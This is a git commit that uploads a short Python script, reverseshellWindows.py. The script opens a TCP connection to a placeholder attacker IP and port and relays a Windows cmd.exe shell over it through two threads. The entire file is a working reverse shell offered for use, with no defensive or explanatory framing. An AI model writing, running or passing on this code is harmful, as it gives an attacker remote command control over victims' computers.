96bc8f139a68aade0d5f6deed3c4abf9bb2c4de4
Thiagous <64616891+thiagous06@users.noreply.github.com>
2021-08-14 17:00:31 -0300

    Add files via upload

---
+++ reverseshellWindows.py
@@ -0,0 +1,33 @@
+import socket
+import subprocess 
+import os
+import threading
+
+def send(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("IP ATACANTE","PUERTO"))
+
+p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+s2p_thread = threading.Thread(target=send, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
